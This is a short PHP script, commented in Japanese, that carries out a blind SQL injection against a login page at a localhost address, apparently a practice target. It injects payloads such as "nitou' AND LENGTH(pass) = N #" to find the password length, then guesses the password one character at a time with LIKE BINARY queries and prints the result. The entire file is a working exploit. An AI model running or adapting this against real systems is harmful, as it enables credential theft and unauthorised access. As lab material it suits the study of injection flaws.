<?php
	// ログインを試行する
	function login($user){
		// POSTリクエストを送信準備
		$h = curl_init("http://127.0.0.1:8080/3.php");
		curl_setopt_array($h, [
			CURLOPT_POST => true,
			CURLOPT_POSTFIELDS => http_build_query([
				"user" => $user,
				"pass" => ""
			]),
			CURLOPT_RETURNTRANSFER => true
		]);
		
		// POSTリクエストを送信しレスポンス取得
		$resp = curl_exec($h);
		
		// ログインに成功していたらtrue, 失敗していたらfalseを返す
		return strpos($resp, "succeeded") !== false;
	}
	
	// パスワード長の特定
	for($len = 1; ; $len++){
		if(login("nitou' AND LENGTH(pass) = {$len} #")){
			break;
		}
	}
	echo("Password length: {$len}\n");
	
	// パスワードの特定
	$pass = "";
	for($i = 0; $i < $len; $i++){
		for($ch = 32; $ch <= 126; $ch++){
			// % と _ と ' はエスケープしなければならない！
			$try = $pass . chr($ch);
			$try = str_replace(["%", "_", "'"], ["\\%", "\\_", "''"], $try);
			
			if(login("nitou' AND pass LIKE BINARY '{$try}%' #")){
				break;
			}
		}
		$pass .= chr($ch);
		echo("Hit: {$pass}\n");
	}
	echo("Password: {$pass}\n");
?>